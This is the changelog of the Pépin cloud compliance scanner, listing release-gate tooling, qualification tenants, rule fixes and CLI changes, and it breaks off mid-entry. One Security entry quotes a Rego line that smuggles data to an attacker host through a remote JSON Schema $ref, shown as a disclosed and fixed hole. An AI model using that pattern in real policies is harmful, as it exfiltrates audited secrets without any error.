> 🇬🇧 English · [🇫🇷 Français](CHANGELOG.fr.md)

# Changelog

Notable changes, in the format of [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
versioned according to [Semantic Versioning](https://semver.org/).

This file is read by the release workflow: the section matching a tag becomes
the body of its GitHub Release. An entry that is not here is an entry nobody
downloading a binary will ever see.

Two kinds of change deserve their own line whatever their size, because they
are what a compliance chain built on Pépin is judged on: **a surface a
consumer's pipeline parses** (the assessment, findings, bundle or OSCAL shape,
an exit code, a CLI verb or flag), and **a verdict that can change on an
unchanged tenant** (a rule tightened or loosened, a control activated or
retired, a normative mapping retriaged). The first breaks their parsing; the
second makes their user explain to an auditor a change they did not make, and
this file is where that explanation starts. A refactor that changes neither
belongs in `git log`.

## [Unreleased]

### Added

- **`mise run release-gate -- vX.Y.Z` — one verdict before a tag, GO or NO-GO, with its
  report** (issue #178, stages 1 and 4). `release-check` and the canary each did what
  they said; what the repository had no way to produce was a **single** verdict, read
  from what a user actually experiences. A one-day external audit found by hand five
  defects that no gate was looking at, and three of them were claims the
  **documentation** made. So beyond running what already existed as one — preflight,
  `audit`, `adr-drift`, `falsify:all`, a bounded fuzzing campaign, the generated doc
  blocks — stage 1 now measures those claims: no Pépin version pinned in
  `docs/install*.md` or `examples/` predates the minimum
  `references/release/pinning.yaml` declares safe (and both install pages cite it);
  every relative link in the documentation resolves, **anchor included**; and the
  binary's opening sentence names exactly the registered providers, measured by
  running it. Stage 4 adds the rule the CHANGELOG header already promised: an
  `expected.yaml` that moved since the previous tag obliges a CHANGELOG that moved
  too — a verdict changing on an unchanged tenant is what its reader will have to
  explain to an auditor. Each stage writes `release-gate/stageN.json` and the run ends
  with `release-gate/REPORT.md`, meant to be attached to the release. Three
  non-negotiable rules: nothing says GO while a stage is red; a skipped stage carries
  a **written** reason that appears in the report, and a silent `--skip` is refused;
  and the gate must be able to go red — `mise run gate:selftest` breaks each rule and
  demands a refusal, and runs inside `prepush`.

- **Release gate, stage 2 — the artefacts as a user gets them** (issue #178). CI proves
  the *mechanisms* work, on artefacts it builds itself and serves over a loopback. It
  says nothing about the **published chain** — the signature living at Sigstore, the
  attestation at GitHub, the image on ghcr.io — which can stop verifying without a line
  of this repository moving. Stage 2 rebuilds the binaries with the workflow's own build
  line (they must carry their tag and keep their exit codes), then, against the previous
  tag's real assets: the README's "Verify what you downloaded" block, the `cosign verify`
  and `docker run` of `docs/install.md`, the action's installer — which must accept the
  published binary **and** refuse the same binary with one byte changed — and the GitLab
  template's `before_script` in the `alpine:3.21` it declares. Those commands are
  **extracted** from the documentation, never copied into the gate: copying would prove
  the copy works, extracting proves the page works, which is the invariant of ADR-0016. A
  reorganised page turns the gate red instead of passing silently. Each check skips with
  a written reason when its tool is missing — and a stage whose measuring checks were
  **all** skipped is reported SKIPPED, never GO, because a green that measured nothing is
  the defect this product holds against others.

- **Qualification tenants for Outscale and Exoscale** (issue #198). Outscale: 79 Terraform
  resources plus 6 OOS buckets and an inline EIM policy created by the tenant's `extra`
  hook, applied and destroyed on a real account — the two-NIC machine, the root access
  key, the `iam_policy_*` family, snapshots, a public OMI, load balancers; the runner
  now applies `pre_destroy_vars` before destroying (a protected VM does not destroy,
  provider #88) and re-lists until deletions settle. Exoscale: plan-only, 37 resources,
  no account — the Terraform source is pinned, the live half waits for an account.

- **Exoscale qualification tenant, live half** (issue #198): 40 resources in the full
  plan, 39 applied (the organisation's quota is four instances; the Swiss instance is
  plan-only through `terraform_only_resources`) plus 3 SOS buckets created by the
  `extra` hook (one of them with Object Lock, through the S3 API), applied, scanned
  `--live` in five formats, sealed, destroyed and proven destroyed across two zones
  (15 API families + buckets, before/after delta). The expected organisation comes
  from `PEPIN_QUAL_EXO_ORG` and is confirmed by `GET /api-key/{key}` → `org-id`
  before any apply. What the live pass found, pinned as measured and filed: SOS
  accepts `PutBucketTagging` and persists nothing (#208, every SOS bucket fails
  `governance_resource_required_tags`); `kubernetes_cluster_audit_logging_enabled`
  passes live on a cluster whose audit is disabled (#209, false green: the API returns
  `audit: {}` and `audit_enabled` is derived from `audit.endpoint`); `region` is
  projected on no live resource (#210, `governance_resource_region_in_eu`
  not-evaluated); instance labels are not collected live (#211, an untagged instance
  passes); a private instance carries no security group by construction (#212,
  `compute_instance_has_security_group` fires with an impossible remediation); every
  SKS cluster creates an `sks-ccm-*` IAM role that fails two `iam_role_*` controls
  (#213). The two rule changes of #206 are pinned: `…_all_ports` is `not-applicable`
  on Exoscale, `network_securitygroup_unrestricted_egress` fails on `tcp 1-65535`.

- **A qualification tenant, applied and destroyed on a real account** (issue #178,
  stage 3). `PEPIN_GATE_LIVE=1 mise run qualify` applies the Terraform stack committed
  under `references/qualification/scaleway/` — 40 resources in the plan, 29 of them
  applied: the five types a live scan collects; managed databases, private networks
  and IAM policies exist only in the plan, because no live scan would see them —,
  one fault per resource, one counterexample per control, scans it with `--live` in every format, seals and
  verifies the bundle, scans the same plan with `--terraform`, destroys it, proves the
  destruction (a listing per family on the tenant's tag, plus a before/after diff of
  the account), and compares both assessments with the committed `expected.yaml`
  (control × source × subject → status). The runner refuses to start on an account
  other than the one pinned there, and breaks one of its own expectations at the end
  of every run to prove it can say NO-GO. A maintainer's gesture with native
  credentials only, never CI.

### Security

- **A shared evidence bundle no longer names a person.** `iam_user.username` is mapped
  from `email` at both Scaleway and Exoscale, so an MFA finding's subject was an e-mail
  address — and it travelled verbatim into `assessment.json`, the OSCAL, the SARIF and
  the sealed `input.json`. A bundle is meant to be handed to a **third party**: the tool
  was putting personal data in it without anyone deciding to. `--redact`, already the
  "for a third party" switch, now substitutes those subjects with the user's **stable
  identifier**, in the inventory, in the sealed assessment and in the evidence line that
  quotes them. The address is not dropped — an operator fixing an MFA needs to know who —
  the **local report is unchanged**; only what leaves the perimeter is. Which attribute
  names a person is **declared in the provider descriptor with its source**, never a
  hard-coded list in the CLI.
- **A collector no longer reads back a request it has just put a secret into.** CodeQL
  reported, at `high`, a secret key reaching a published report: a collector set its
  credential as a header, then rebuilt the call signature from that same request object
  to record it as provenance. The alert is a **false positive** — only method, scheme,
  host and path are read, never a header or a query — but the analysis is right in
  principle, and a string built before the credential is attached cannot become wrong
  later. The signature is now computed **before** authentication is applied, in one
  shared helper used by the three collectors that record it. Provenance still never names
  a call that did not happen: the string is computed early and used only after a response.
- **`verify` no longer accepts a bundle that contradicts itself.** Rewriting four
  `fail` results into `pass` and recomputing the digest of the file touched produced a
  bundle reported as "internally consistent", exit 0 — while its own `manifest.json`
  still announced `"fail": 4`. The bundle already carried the information that
  contradicted it, and nothing compared the two. Three cross-checks now do, none of
  them needing a key: the manifest summary is reconciled with the statuses actually
  present in `assessment.json`, each artifact's declared **size** is checked alongside
  its digest, and `checksums.txt` is parsed **strictly** — an unreadable or duplicated
  line is a refusal, where an appended byte used to go unnoticed.
- **`verify --require-signature`** fails when no signature was verified. A caller
  scripting `verify` received 0 for a bundle the tool itself calls non-defensible: the
  warning was on stdout, the exit code said success, and automation reads the exit
  code. Opt-in, so no existing chain changes. CLI surface v5 → v6.

  What this does **not** do is close the digest chain, and the limit is worth stating:
  nothing inside a bundle can anchor `checksums.txt`, because whoever rewrites a file
  rewrites the anchor too. Only the detached cosign signature closes it. These checks
  catch corruption and self-contradiction, not a determined forger.

### Security

- **A third-party policy could exfiltrate the audited inventory, silently.** Rules
  hot-loaded through `--policy-dir` are third-party code, run over everything the scan
  collected. The engine had removed `http.send`, `net.lookup_ip_addr` and `opa.runtime`
  and said the network was out of reach; that was not true. OPA resolves a JSON
  Schema's remote `$ref` over HTTP **at evaluation time**, on a path no builtin guards,
  so one line was enough:
  `json.match_schema(input, {"$ref": sprintf("%s/leak/%s", [attacker, input.secret])})`.
  Measured against the pinned scankit v0.2.2 with a witness server: the request left,
  and `Evaluate` returned **no error** — the silence is the part that mattered.
  scankit is now pinned to v0.3.1, whose capability set carries `AllowNet: []string{}`
  (empty and non-nil denies every host), and `TestNoThirdPartyPolicyCanReachTheNetwork`
  holds a witness against it so a pin regression cannot reopen it quietly.

### Fixed

- **An identity the platform creates, uses and deletes no longer brings two unfixable
  deviations per cluster.** Exoscale's SKS creates an `sks-ccm-<cluster>` role for the
  cluster's cloud controller manager and removes it with the cluster. It is
  `editable: true`, so the predefined-role filter did not cover it — and every cluster
  brought two IAM findings nobody could clear: binding the role to a source IP would mean
  guessing the control plane's addresses, and adding a lifetime clause would break the
  component. Ten clusters meant twenty irreparable findings. The fact is now **collected**
  (`provider_managed`) and **declared in the provider descriptor with its source**, never
  hardcoded as a name prefix inside a rule — a common rule knows no provider's naming
  convention, and a prefix repeated in each would diverge at the first change. A shared
  helper reads it, and the same role **without** the mark still raises all three findings.
- **A bucket store that accepts tags and keeps none no longer produces a deviation on
  every bucket.** Exoscale's SOS answers `200` to `PutBucketTagging` and persists
  nothing: the `GetBucketTagging` that follows returns `NoSuchTagSet` immediately —
  measured through the AWS CLI and a hand-written SigV4 request. That same response means
  *"no tags"* at a provider that keeps them, and *"this API does not keep them"* here, so
  projecting `[]` asserted a choice the operator had not made and cannot make. The
  descriptor now declares it (`s3.tags_persisted`), the attribute is not projected, the
  capability lock returns `not-evaluated` — the truth — and the tagging control stays
  silent instead of flagging every bucket of the organisation with a remediation that
  never succeeds. `tags` remains a collector capability, so coverage keeps announcing it
  where it does exist.
- **A private instance no longer gets a `critical` deviation it cannot fix.** Where a
  provider's security groups filter the **public** interface, an instance without one is
  given `security-groups: []` **by construction** — the API does it, the operator did not
  choose it, and no remediation changes it. Ten private instances meant ten unfixable
  `critical` findings, which is the shortest path to a tool being ignored. The fact is
  now **observed** (`public_interface`, derived from Exoscale's `public-ip-assignment`),
  not inferred from a missing `public_ip`, which would not tell "private" from "not
  collected". Where a provider does not publish that field, nothing changes; and an
  instance **with** a public interface and no group is still a `critical` deviation.
- **Two more `pass` verdicts nothing established, both from the same shape as the audit
  of a rule without a description.** A guard asked *per resource* a question that is
  *per provider*, and the capability lock — seeing the attribute collected on the type
  thanks to a neighbour — let the assessment conclude with no finding.
  `kubernetes_cluster_audit_logging_enabled` defaulted an absent `audit_enabled` to
  **true**, while the SKS API **omits the `audit` object when audit is off**: a cluster
  with no audit had no attribute, the rule assumed "enabled", and the report said `pass`
  on the very case it exists to catch. `governance_resource_required_tags` skipped, in
  silence, every resource whose type does not carry `tags` — measured on an Exoscale
  tenant where SOS buckets carry them and instances, volumes and clusters do not. Both
  questions are now asked of the **inventory**, and the tags one **per type**: a bucket
  carrying tags proves nothing about an instance, since those are two APIs and two
  collections. The counterexample each guard protected still holds, with its own test: a
  provider that exposes the capability nowhere still fires nothing.
- **One database got two subjects on a Terraform plan.** The ACL-derived deviation named
  the ACL resource, the instance-derived ones named the database: three deviations, two
  names — and an exception written on one missed the other, silently. Two things were
  needed. A mapping that reads its carrier through `_parent.<field>` now gets that field
  filled from the declared reference, like any other argument (ADR-0022 filled simple
  paths only). And the address so obtained is then resolved to the **identity the target
  carries in the inventory** — a database that has a `name` is named by it, not by its
  Terraform address. The rewrite is bounded to attributes actually filled from a
  reference: a value that merely looks like an address is never touched. The same fix
  makes a Scaleway bucket's subject read `backups-prod` instead of
  `scaleway_object_bucket.backups`, which is what a reader is looking for.
- **A control emitted six correct deviations on a provider the reference did not
  declare it for.** `objectstorage_bucket_default_encryption` fires on Scaleway — the
  shared S3 collector sets `default_encryption_enabled` on every bucket, and SSE is
  opt-in per bucket there, so a bucket without one writes objects in cleartext. The
  verdicts were right; the declaration was wrong, and the coverage matrix said ✗ for a
  provider the tool was actually measuring. Declared now, with the attribute recorded in
  the provider contract and its source.
- **Two controls declared ✅ for Exoscale could never fire, and the two cases did not
  deserve the same answer.** Both required `protocol == "all"`, which an Exoscale
  security group rule cannot express (the provider schema and the v2 API accept only
  ah, esp, gre, icmp, icmpv6, ipip, tcp, udp). `…_to_all_ports` is now **not applicable**
  there, with the sourced justification: the any/any mechanism does not exist, and the
  port-family controls cover the real case. But `unrestricted_egress` was **broadened**
  instead — an open egress does exist on Exoscale, written `tcp 1-65535 → 0.0.0.0/0`,
  and declaring it unmeasurable would have hidden a real posture fact. The bound is
  strict: an egress limited to a few ports is filtering, and shouting at it is the false
  positive that gets a tool switched off.
- **A Terraform plan localises by zone, and the region was read raw.** Scaleway writes
  `fr-par-1` on a server, Outscale `eu-west-2a` on a VM; the mapper took the value as-is,
  so it posted a zone name as a region — a name no catalogue knows — and
  `governance_resource_region_in_eu` returned `not-evaluated` on **every** plan, while the
  operator had written the location in clear. A `region_of_zone` transform now derives it,
  declared per mapping. The naming schemes are the published ones, and a guard confronts
  every derived region with the provider's own region catalogue: a provider that changed
  convention makes it go red rather than silently posting an invented region into a
  sovereignty report. What does not derive yields nothing, so the capability lock says
  `not-evaluated` — a wrong region there would be worse than none.
- **A security group rule with no description got `pass` — from the control that
  exists to catch exactly that.** The rule guarded itself with `"description" in
  object.keys(...)`, meant to answer "does this provider expose the field at all", but
  asked **per resource**. On a Terraform plan an operator who writes no description
  simply produces no field, so the rule stayed silent — and the silence became a
  `pass`, because the capability lock saw `description` collected on the type (another
  rule carried it) and let the assessment conclude with no finding. A `pass` nothing
  established, on the very deviation the control targets. The question is now asked of
  the **inventory**: if any rule carries the key, the provider exposes the field, and a
  rule without one is undocumented. No rule reads the provenance — ADR-0017 forbids it —
  and the counterexample the original guard protected still holds: a provider that
  exposes the field nowhere still fires nothing.
- **A subject at fault by several routes no longer reads as several deviations.** Three
  `deny` blocks of `objectstorage_bucket_public_access` — a canned ACL, a grant, a bucket
  policy — conclude on the same bucket, and each cause is real. But a public bucket is
  *one* problem, and printing it three times made the report look bigger than what it
  measures. Worse, it took all three slots of the "immediate action" panel, which
  announces the three **most severe** deviations and delivered the same one three times.
  Fixed upstream in scankit 0.3.5: one line per subject with its causes beneath, and the
  panel deduplicates by (code, subject) before ranking. The aggregation is of the
  **display only** — the block's count, the parsable formats and the severity tally still
  carry every cause separately.
- **A document without an inventory's shape is refused instead of being scanned as an
  empty one.** A `terraform show -json` output handed over without `--terraform`, or an
  empty object, was accepted and evaluated as an empty inventory: exit 3, "nothing
  measured". Honest about what was measured, wrong about the cause — the caller does not
  have an empty scope, they gave the wrong file, which is exit 2. A plan is named as such
  ("this file is a Terraform plan: scan it with `--terraform`"), and the opposite swap
  was already refused, so both directions now move in step. The repository's own tests
  were relying on the defect: two of them passed a plan in the inventory position.
- **The coverage matrix measures what a plan carries instead of declaring what the
  mapping names.** `compute_instance_public_ip_with_open_securitygroup` read ✅ for
  outscale/terraform while `public_ip` is computed — Terraform only knows it after
  `apply`, so no real plan carries it — and the veracity scenarios confirmed the cell on
  a hand-written plan where the attribute is a literal. Coverage is now corrected by what
  the reference tenant plans, generated from third-party HCL, actually yield. Three cells
  drop from ✅ to ◐, and the reason distinguishes "the mapping does not name it" (fixed in
  the spec) from "the mapping names it but no plan carries it" (not fixable there at all).
  Six obligations that could never be met leave the veracity ledger with them.
- **The terminal report printed one control's title and remediation over another
  control's findings.** A block prints a code, a title and a remediation and then lists
  findings underneath, so it *asserts* those three of every finding it gathers —  but
  findings were grouped by SCSL code alone, and a requirement often covers several
  controls. The title and remediation were then those of the first finding. Measured on
  a real tenant, the line a reader acts on told them to revoke a root key in order to
  fix a `Resource="*"` grant. Fixed upstream in scankit 0.3.4: the grouping key is now
  exactly what the block asserts, so `CLD-IAM-1` renders one block per control and the
  controls table stops summing severity and counts across different controls on one row.
  A single control under a code renders identically.
- **A VM public through a secondary NIC, with SSH open on that NIC, produced no
  finding.** The collector projected the union of the NICs' public IPs, so the machine
  counted as public — but it confronted that with `Vm.SecurityGroups`, which the OAPI
  documents as the **primary** NIC's groups. Measured on a real tenant: SSH answered on
  the public address and the report said nothing. Exposure is a property of the
  **interface**, so a `network_interface` resource is now collected per NIC (`nic_id`,
  `vm_id`, `public_ip`, `security_group_ids`) and the rule pairs an address with the
  groups **of the same card**. Flattening is wrong in both directions, which is why the
  fix is not a wider union: a public NIC with a closed group plus a private NIC with an
  open one would read, once merged, as "public and open" — a deviation the machine does
  not carry. Where NICs are not collected (a Terraform plan), the machine is still judged
  on its own attributes: a silent fallback would have made deviations disappear.
- **SecNumCloud was declared per provider, while a qualification covers a scope of
  regions.** Outscale's covers `cloudgouv-eu-west-1` and that one only; an `eu-west-2`
  tenant read "SecNumCloud qualifié" inside a sovereignty `pass`, which is the first
  claim an auditor contests. The descriptor now declares the scope
  (`secnumcloud_regions`, sourced), and the `secnumcloud` attribute is rendered **for the
  region actually scanned**: `qualifie` inside the scope, `hors_perimetre` outside it,
  `perimetre_inconnu` when the scan has no region — a scan that does not know where it
  applies does not decide. The qualification therefore no longer grants extraterritorial
  immunity outside its scope, and the provider page can no longer print the status
  without it. No new deviation is emitted and no exit code moves.
- **The install page pinned `v0.1.0`, the version this repository itself declares
  refuses every installation.** `examples/github-actions/pepin.yml` says it in as many
  words: in v0.1.0 and v0.1.1 the action's installer called `gh attestation verify`
  without a token, which refused *every* install. The install page is the first page a
  newcomer copies from. Every pin now names the latest release, a sentence says the
  caller passes no token since v0.2.0, and a guard requires the pinned versions to equal
  the latest release recorded in the CHANGELOG — read from the repository rather than
  from git tags, so a CI checkout without tags cannot make it drift.
- **Four CLI messages pointed at the wrong thing.** `--policy-dir /nonexistent` and
  `provider validate <file>` both reported `.` — the root of the filesystem view they
  had just built — instead of the argument received; a file passed where a directory is
  expected is now refused as such. `--kubeconfig` without `--live` offered two sources
  that are not the one the caller had just named; the error and the flag's help now say
  it needs `--live`.
- **An unknown `--region` is flagged before the collection fails.** `--region
  eu-nowhere-9` cost a minute of failing DNS lookups and seventeen "service unavailable"
  units to read before the cause became guessable. It is a **warning**, not a refusal:
  the region list belongs to the provider, and one added tomorrow must stay scannable
  the same day — which is what separates it from an unknown `--gate`, whose vocabulary
  is Pépin's own. The catalogue lives next to the provider descriptor and a guard
  requires it to match the one the sovereignty rules already carry.
- **`control explain` accepts the code the report prints.** The terminal report's `Code`
  column and every block header carry the SCSL requirement (`CLD-STO-1`), and
  `--format json` carries it in `code`; the command accepted only the check identifier,
  which the report never prints. A reader who had just read a verdict had to guess.
  Both forms now work, case-insensitively, and a requirement covering several controls
  names them all rather than silently picking one.
- **An access key whose expiry has already passed no longer counts as compliant.** The
  rule only refused a MISSING date, so a key still `ACTIVE` two years past its expiry
  passed — measured on a real tenant. Both readings of that state are bad, which is why
  the pass was wrong: either the provider still honours the key and the expiry protects
  nothing, or it does not and a dead key is still declared active. The scan does not
  need to settle which to know that "compliant" is false. The reference instant is the
  EVALUATION time, not the clock, so replaying a sealed bundle yields the same verdict.
- **A scan that measured nothing no longer renders as compliant.** A green tick,
  "No deviations found in the audited scope" and four severity counters at zero were
  printed immediately above a verdict saying `INDÉTERMINÉ`. Three signals literally true
  and collectively misleading: "no deviation was found" and "nothing was looked at"
  rendered identically. The exit code was already 3, so automation behaved correctly —
  the failure mode was the person skimming a terminal, or the screenshot pasted into a
  ticket. The marker is now neutral, the line names the cause, and the counters are
  omitted. A genuinely compliant scan keeps all three, and the test asserts that too:
  making the two cases identical would only have moved the confusion.
- **A security group open to the whole internet through `/2` ranges produced no
  finding.** `is_public_cidr` called a range public only at prefix ≤ 1, so the four
  ranges `0.0.0.0/2`, `64.0.0.0/2`, `128.0.0.0/2`, `192.0.0.0/2` — which together cover
  all of IPv4 — went unnoticed, while `0.0.0.0/1` in the same group was caught. Measured
  on a real Outscale tenant: RDP open to the entire internet, and the report silent. A
  `/3`, or a list of `/8`s, passed the same way. A source is now unrestricted when it is
  **wide** (prefix ≤ 8) **and not private** — the second condition is what keeps
  `10.0.0.0/8` on port 22 silent, and a partner network like `203.0.113.0/24` is
  deliberately not flagged: "open to the internet" and "open to someone else" are
  different claims.

  The union is closed too: `net.cidr_merge` collapses a rule's ranges before they are
  judged, so 512 `/9` covering the space become `0.0.0.0/0` and fire — measured. The
  raw entries are still tested alongside, because a maskless literal (`0.0.0.0`, `*`)
  is not a valid CIDR and the merge would lose it; and only valid entries are merged,
  because `net.cidr_merge` goes undefined on a malformed one, which would silence the
  rule on third-party input.

  The merge only brings CONTIGUOUS ranges together, so a checkerboard escaped it: 256
  `/9` one in two — half the internet — merged to 256 unchanged blocks and stayed
  silent. The public addresses a source list opens are now COUNTED, exactly: merged
  blocks are disjoint, and two CIDRs are either disjoint or nested, so a block's public
  size is its own minus the special-use blocks it contains. One finding per resource
  names the union — `0.0.0.0/0`, or `256 CIDR → 1848508416 IPv4` — rather than one per
  range.
- **The root description names the providers that exist.** The first sentence a new
  user reads advertised OVH — a roadmap entry, not a provider — and omitted Kubernetes,
  which is one. The list is now derived from the registry: a copied list goes stale at
  the first provider added or removed, and nobody rereads a welcome sentence.
- **`pepin scsl --index` no longer defaults to a maintainer's checkout layout.** The
  default was a relative path climbing out of the working directory into a repository
  the reader has never heard of. The error was correct and said nothing: one could not
  tell whether `framework-scsl` was something to install, a submodule left
  uninitialised, or an internal project. `--index` is now required, and the message says
  what the file is, that the command is a **maintenance** tool a scan does not need, and
  gives an example.
- **An unknown `--format` value is refused instead of falling back to the table.** The
  scan ran and printed the table report, with the exit code of a successful scan. The
  dangerous case is not someone typing `xml` at a prompt and noticing: it is a pipeline
  step written `--format oscal` edited to `--format oscal2`, publishing a coloured table
  where the whole downstream chain believes it is receiving OSCAL. An unknown format
  belongs with an unreadable export and an unknown provider — an invocation error, exit
  **2**, not a scan result.
- **French mode no longer leaves the report scaffolding in English.** Section titles,
  table headers and the "no deviations" line came out English inside an otherwise
  French report — `Total deviations: 1` above a French finding, closing on a French
  verdict. The framework's own strings did too: usage template, `help for <cmd>`,
  argument-count errors, unknown-flag errors. A report half-translated reads as
  unfinished work rather than a choice, and the intended reader — a French-speaking
  auditor of a sovereign cloud — is exactly the one who notices.

  One string stays English: cobra's `unknown command … Did you mean this?`, built deep
  in `Command.Find` with no hook. Translating it would mean matching its English text,
  making behaviour depend on a dependency's wording.
  `TestTheUntranslatedCobraResidueIsKnown` keeps that residue inventoried and fails in
  both directions, so it can neither grow nor be forgotten once fixed upstream.
- **An unknown subcommand no longer exits 0, and no longer runs something else.**
  `pepin provider inexistant` silently ran `provider list`; `pepin control list` — the
  natural guess, symmetric with `provider list` — printed a help screen and succeeded.
  A pipeline step written `pepin control list --json > controls.json` therefore wrote a
  help screen into the file and went green. Every command now validates its arguments
  and exits **2** on one it does not understand. A guard walks the command tree rather
  than checking a hand-written list, and it found a fifth case the report had not:
  `provider list` ignored any argument.
- **An inventory whose origin contradicts the requested ruleset is now refused.**
  Scanning a Scaleway inventory with the Exoscale rules was accepted without a word and
  produced six `pass` verdicts. Those passes were not wrong by accident, they were
  meaningless: the resource shapes overlap just enough for rules to evaluate and
  conclude. The failure mode was quiet and realistic — a typo in a pipeline, a
  copy-pasted job — and the report looked entirely normal, with a non-zero exit code
  that even suggested the scan had done its job. The declaration is read from the root
  of the export and from its resources, and a mismatch exits **2**, the code already
  used for an unreadable export. An inventory that declares nothing is not refused: an
  absent origin is not invented.
- **`evidence.proves` no longer travels as `["","",""]` on every result.** `omitempty`
  on a fixed-size array is a no-op, so a reader could not tell "no proof recorded" from
  "three proofs recorded, all blank" — including inside sealed bundles archived for
  later. Fixed upstream in scankit v0.3.1 and guarded here, where the dossiers are
  published.

### Added

- **The fuzzing corpus survives a campaign.** Interesting entries accumulated in
  `GOCACHE`, which disappears with the machine — and a CI runner always starts cold.
  Measured here: 125 interesting entries in twenty-five seconds against two versioned
  seeds, so every campaign restarted from two and re-walked the ground the previous one
  had already covered. That is lost *work*, repeated every run. `mise run fuzz-promote`
  promotes entries into the versioned corpus under three written rules: a deterministic
  capped sample (a random one would make the diff unreadable and the result
  irreproducible), a cap that bounds the **corpus** rather than the run (each seed is
  replayed by every `go test`, so a corpus that swells is a permanent cost that swells
  with it), and — the one that matters — **each candidate is run against the current
  tree before it is accepted**. A seed that brings its target down is set aside and
  named: it enters with the fix it motivates, never before. The campaign workflow now
  keeps what it explored on every run, not only on failure, and prints the seed count it
  started from.
- **`iam_accesskey_rotated`: the rotation half of CLD-IAM-2, which nothing measured.**
  The requirement asks for long-lived keys "with an expiry AND a rotation". The expiry
  reads off a field; the rotation reads nowhere — it is deduced from the key's age,
  because a key never replaced is a key never rotated. Measured on a real tenant: a key
  expiring in 2099 satisfies the expiry control while no rotation has ever taken place,
  and an account with `MaxAccessKeyExpirationSeconds: 0` has no ceiling to bound it
  either. The window is `controls.iam.key_max_age_days`, 90 days by default; widening it
  silences deviations, so the reference binds it to the requirement through
  `au_plus_le_defaut`. Inventory schema v4 → v5: an `access_key` now carries
  `creation_date` (osc-sdk-go v2.24.0 `AccessKey.CreationDate`, verified in the SDK).
- **`scan --gate <all|security|compliance|sovereignty>`: a profile for the CI gate,
  which hides nothing.** A first scan should trigger "oh, that one is interesting", not
  "yes, I know my test VM has no deletion protection". The report stays COMPLETE in
  every format — the rule already applied to exemptions and inconclusive findings: the
  report says everything, only the gate filters. What changes is what weighs in the
  **exit code**, and every scan prints what was set aside and why.
  **No profile can turn a red chain green**: a `1` becomes a `3` at worst — "does not
  establish compliance", the honest reading of a deliberately partial scan (ADR-0005,
  and still no fifth code) — never a `0`. The default stays `all`, so nothing changes
  without the flag. CLI surface v5 → v6. The flag is not `--profile`: that name already
  designates the live-collection credentials profile.
- **A finding now declares its CONFIDENCE, distinct from its severity.** Severity says
  the consequence if the problem is real; confidence says how sure Pépin is that it
  established the problem at all. A volume with no recent snapshot and a VM with SSH
  open to the internet were both `high` and indistinguishable — the first is
  `contextual` (the rule documents it itself: a volume may be backed up otherwise), the
  second `confirmed`. `labels.confidence` is one of `confirmed`, `probable`,
  `heuristic`, `contextual`, declared per rule, and a rule without one breaks CI.
- **`labels.category` gains `sovereignty` and `hygiene`.** Sovereignty is this
  product's reason to exist and was filed under `compliance`, where a filter could not
  find it; documentation hygiene is neither a vulnerability nor a normative breach, and
  conflating it with either is what makes a first scan irritating. Seven findings move
  to `sovereignty`, three to `hygiene`.
- **The secret-detection confidence vocabulary is unified with the common one**:
  `high`/`medium`/`low` become `confirmed`/`probable`/`heuristic`, with no granularity
  lost. A `secrets.min_confidence` written with the old words is still accepted, at the
  same rank, and normalised in the resolved configuration — a committed policy does not
  change meaning in silence.
- **The quality map now publishes precision, derived from the counterexample corpus.**
  "42 controls" is a sentence every CSPM says. Catching and staying SILENT are two
  different measurements, and they are now printed side by side: 42 active
  `high`/`critical` controls, 18 with a detection path proven end to end, 16 with a
  legitimate counterexample, 0 false positives measured on the hardened
  counter-witnesses. There is deliberately **no false-negative row**: nothing in the
  repository measures them, and a published "0" would mean "we did not look". A gate
  fails if that field is ever added, and another refuses any precision figure larger
  than its denominator.
- **Every `high`/`critical` rule must now prove what it REFUSES to fire on.** The
  veracity contract proved Pépin could produce the expected verdict; it never proved
  it *withholds* that verdict on a near-identical but legitimate configuration. A rule
  that fires on everything is perfectly sensitive and has no measured precision at all.
  A counterexample is a **pair** on one control × provider × source path: a `fail` case
  and a close `pass` case. 13 written so far, each proven in both directions; the 26
  still missing are counted in a ledger that is exact both ways, and a new
  `high`/`critical` control without its counterexample breaks CI.
  `mise run counterexamples-update` regenerates it.
- **Reference tenants: third-party configurations, replayed on every build.** A
  fixture is written by the author of the rule, so it proves the rule *fires* — never
  that it is *right* about a configuration nobody designed for it. Six real, published,
  MIT/Apache-licensed stacks (two per sovereign provider) are now pinned to a commit
  under `references/tenants/`, scanned through the binary on every build, and compared
  to the verdicts recorded beside them. Each provider carries an **exposed** tenant and
  the corresponding **hardened** counter-witness — the only place a false positive
  shows up. Nothing is provisioned: `terraform plan` creates no cloud resource.
  `scripts/reference-tenant.sh --all` re-derives the six plans from their upstreams
  **byte for byte**, so a reviewer can check they are not files Pépin ended up writing
  to itself. See [Reference tenants](docs/guides/reference-tenants.md).
- The plan committed for a tenant carries **only what Pépin reads** (`planned_values`
  and module `source`s), with every value Terraform itself marks `sensitive` nulled.
  `TestNoReferenceTenantPlanCarriesMoreThanPepinReads` refuses the rest: `variables`,
  `provider_config`, `prior_state` and `resource_changes` are exactly where a plan
  taken on a real tenant would carry its credentials.

- **Canary scans at release qualification.** `mise run canary` queries the **real**
  control plane of each cloud provider and records what it answered in
  `references/canary/<provider>.yaml`, committed and dated. It holds **no
  credential** and needs none: it sends synthetic values the provider refuses, and
  what it measures is the refusal — an endpoint answering 401/403 exists and
  resolves, a moved one would answer 404, the regression a descriptor cannot see
  coming. First measurement, 31 endpoints: all answered, none moved. It does **not**
  establish that a *sufficient* right returns `200`, so it does not count as live
  validation of a control. Completeness is a test gate (`internal/canary`);
  **freshness** — no record older than 90 days — is checked by the preflight, which
  never holds a secret. See [Releasing](RELEASING.md).

- **A generated detection quality map**, [docs/detection-quality.md](docs/detection-quality.md).
  Rather than announcing "57 controls", it publishes what is verifiable: **63 verdicts proven
  out of 458**, **23 paths fully proven out of 178**, and the breakdown per verdict — `fail`
  10/140, `pass` 24/140, `not-evaluated` 18/156, `not-applicable` 11/22. Every figure is
  derived from the veracity ledger, the reference tenants and the canary records; none is
  typed in, and `TestTheMapNeverExceedsTheLedger` refuses the map and the ledger to diverge.
  **Validated live: 0 %** — derived, not written: only an authenticated record would move it,
  and a canary holds no credential.
- **`pepin control explain <code> [--provider p]`** — a new CLI verb (**cli surface v5**). For
  a control and a provider it renders the chain that makes its verdict defensible: the API
  calls feeding the decision (the `collecte` spec, joins included, plus the shared Go
  collectors), the deciding attributes, the exact conditions for a `pass` in the order
  `assess.Build` evaluates them, the tests that exercise it, and the date of the last live
  validation — which reads `never`, and says why. It reads the **same** committed snapshot as
  the map: two computations would diverge, and the one that diverges is the one people read.

### Changed

- **A refused Outscale unit now names the grant that would have collected it, and the
